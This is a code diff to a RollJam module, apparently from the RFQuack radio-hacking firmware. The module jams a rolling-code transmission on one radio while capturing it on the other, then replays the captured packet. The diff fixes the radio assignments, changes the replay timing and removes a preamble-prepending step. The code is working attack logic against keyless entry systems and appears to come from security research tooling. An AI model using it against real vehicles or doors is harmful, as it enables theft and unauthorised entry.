@@ -17,45 +17,32 @@ public:
     virtual bool onPacketReceived(rfquack_Packet &pkt, rfquack_WhichRadio whichRadio) {
       if (buffer != NULL && bufferSize < bufferMaxSize) {
 
-        // Store received packet.
-        RFQUACK_LOG_TRACE(F("RollJam: Storing packet..."))
-
-        // Create a new packet
-        rfquack_Packet packetToStore = rfquack_Packet_init_zero;
-        packetToStore.has_repeat = true;
-        packetToStore.repeat = 1;
-
-        // Prepend missing part to received packet.
-        byte missingPart[6] = {0xff, 0x55, 0x55, 0x55, 0x56, 0x5a};
-        memcpy(packetToStore.data.bytes, missingPart, 6);
-        memcpy(packetToStore.data.bytes + 6, pkt.data.bytes, pkt.data.size);
-        packetToStore.data.size = 6 + pkt.data.size;
-
         // Store received packet
-        memcpy(&(buffer[bufferSize]), &packetToStore, sizeof(rfquack_Packet));
+        memcpy(&(buffer[bufferSize]), &pkt, sizeof(rfquack_Packet));
         bufferSize++;
         RFQUACK_LOG_TRACE(F("RollJam: stored %d packets"), bufferSize)
 
         // If we filled the buffer, stop jamming, put RadioA in tx mode and re-send the first N packets.
         if (bufferSize == bufferMaxSize) {
 
-          // Stop jamming
+          // Stop jamming on jamRadio
           RFQUACK_LOG_TRACE(F("RollJam: stop jamming."))
-          rfqRadio->setMode(rfquack_Mode_RX, listenRadio);
+          rfqRadio->setMode(rfquack_Mode_RX, jamRadio);
 
-          // Put radioA in TX mode.
+          // Put listenRadio in TX mode.
           RFQUACK_LOG_TRACE(F("RollJam: listenRadio in TX mode."))
           rfqRadio->setMode(rfquack_Mode_TX, listenRadio);
 
-          delay(2000);
-          // Fire packet
+          delay(200);
+
+          // Fire
           RFQUACK_LOG_TRACE(F("RollJam: Will repeat first %d packets"), pktToReplay)
           for (int i = 0; i < pktToReplay; i++) {
             RFQUACK_LOG_TRACE(F("RollJam: Sending %d/%d packets"), (i + 1), pktToReplay)
             rfquack_Packet *packet = &(buffer[i]);
             packet->has_repeat = true;
             packet->repeat = 1;
-            rfqRadio->transmit(packet, rfquack_WhichRadio_RADIOA);
+            rfqRadio->transmit(packet, listenRadio);
           }
         }
       }
@@ -110,7 +97,6 @@ public:
       }
 
 
-
       // Allocate memory to store N packets
       bufferSize = 0;
       bufferMaxSize = pktToCapture;
@@ -150,8 +136,8 @@ private:
     // Config variables
     uint8_t pktToCapture = 2;
     uint8_t pktToReplay = 1;
-    rfquack_WhichRadio listenRadio = rfquack_WhichRadio_RADIOA;
-    rfquack_WhichRadio jamRadio = rfquack_WhichRadio_RADIOB;
+    rfquack_WhichRadio listenRadio = rfquack_WhichRadio_RadioA;
+    rfquack_WhichRadio jamRadio = rfquack_WhichRadio_RadioB;
 };
 
 #endif //RFQUACK_PROJECT_ROLLJAMMODULE_H
